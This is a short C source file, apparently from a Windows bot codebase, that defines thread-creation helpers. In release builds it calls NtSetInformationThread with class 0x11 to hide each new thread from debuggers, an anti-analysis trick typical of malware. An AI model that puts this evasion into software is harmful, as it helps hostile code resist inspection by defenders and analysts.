#include "thread.h"

extern bot_t bot;

BOOL Thread_CreateThread(LPTHREAD_START_ROUTINE lpStart, const LPVOID lpArguments)
{
	HANDLE hThread;

	if((hThread = Thread_CreateThreadEx(lpStart, lpArguments)) != 0)
	{
		CWA(NtClose)(hThread);

		return TRUE;
	}

	return FALSE;
}

HANDLE Thread_CreateThreadEx(LPTHREAD_START_ROUTINE lpStart, const LPVOID lpArguments)
{
	HANDLE hThread;

	if((hThread = CWA(CreateThread)(0, 0, lpStart, lpArguments, 0, 0)) != 0)
	{
#ifndef DEBUG
		CWA(NtSetInformationThread)(hThread, 0x11, 0, 0);
#endif
	}

	return hThread;
}